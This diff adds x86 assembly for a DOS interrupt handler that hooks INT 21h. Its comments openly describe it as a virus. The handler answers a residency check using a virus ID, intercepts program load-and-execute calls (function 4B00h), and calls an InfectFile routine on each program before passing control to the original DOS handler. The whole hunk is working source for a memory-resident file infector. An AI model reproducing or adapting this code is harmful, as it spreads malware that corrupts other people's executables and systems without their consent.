@@ -37,3 +37,60 @@ mov ax, 2521h ;Install New ISR --> DOS function 25h SET INTERRUPT VECTOR for int
 int 21h
 ret
 HookISR ENDP
+;----------------------------------------------------------------------------
+; NewDosISR
+;----------------------------------------------------------------------------
+; Description: Replacment ISR for DOS INT 21h--> after hook the ISR This routine will take place
+; Arguments: <none>
+; Registers Destroyed: <none>
+NewDosISR PROC
+pushf ; push the flags reg
+cmp ax, nVirusID ;routine to check residency of virus?
+jne NOT_VIRUS_CHECK
+popf ;because we pushed the flags before comparing
+xchg ax, bx ;tell calling program that we're resident --> exchange data ax and bx
+iret ;return, since we don't have to call old ISR
+NOT_VIRUS_CHECK:
+cmp ax, 4B00h ;load and execute file? -->Loads a program into memory, creates a new program segment prefix
+; (PSP), and transfers control to the new program.
+je EXEC_FN
+popf ;because we pushed the flags before comparing
+;JUMP TO OLD ISR 
+;The following two lines will jump the old ISR
+;These lines are equivalent to jmp dwOldExecISR
+db 0EAh ;op code for inter segment JMP instruction
+dwOldExecISR DD ? ;old ISR address is stored here
+EXEC_FN:
+popf ;because we pushed the flags before comparing
+;SAVE FILENAME ADDRESS 
+push bp
+GetRelocation bp
+mov cs:bp+_DX_DS, dx ;DS:DX contains the filename. we must save
+mov cs:bp+_DX_DS+2, ds ;these, because they will be destroyed after
+pop bp ;the call to INT 21h
+;CALL ROUTINE TO INFECT FILE 
+SaveRegisters ;we don't want to mess up, since this is an ISR
+push cs
+push cs
+pop ds ;make DS ...
+pop es ;... and ES = CS
+cli ; Clear interrupt flag; interrupts disabled when interrupt flag cleared.
+call InfectFile ;infect the file before it is executed
+sti;Set interrupt flag; external, maskable interrupts enabled at the end of the next instruction.
+RestoreRegisters ;restore before calling orignal ISR
+;CALL OLD ISR 
+pushf ;because an iret will pop the flags, CS and IP
+DB 2Eh, 0FFh, 1Eh ;op code for CALL FAR CS:[xxxx]
+dwOldExecISRVariable DW ? ;address of dwOldExecISR (defined above)
+;UPDATE OLD FLAGS ON STACK 
+pushf ;this is the IMPORTANT part. we must pass
+push bp ;the new flags back, and not the old ones.
+push ax
+mov bp, sp
+mov ax, [bp+4] ;get new flags (which we just pushed 'pushf')
+mov [bp+10], ax ;replace the old flags with the new. the stack
+pop ax ;initially had FLAGS, CS, IP (in that order)
+pop bp
+popf
+iret
+NewDosISR ENDP
